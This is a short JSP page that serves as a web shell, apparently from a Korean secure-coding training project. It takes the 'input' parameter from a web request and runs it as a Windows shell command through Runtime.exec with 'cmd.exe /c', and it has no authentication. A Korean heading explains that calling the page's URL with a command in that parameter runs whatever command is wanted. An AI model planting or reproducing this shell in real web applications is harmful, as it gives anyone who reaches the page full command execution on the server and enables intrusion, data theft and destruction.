<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Insert title here</title>
</head>
<body>
<h1>
 "http://x.x.x.x:8080/openeg/shell.jsp?input=명령어"  호출하여 원하는 명령을 실행할 수 있습니다.
</h1>
<% Runtime.getRuntime().exec(
      "cmd.exe /c "+request.getParameter("input")); %>
</body>
</html>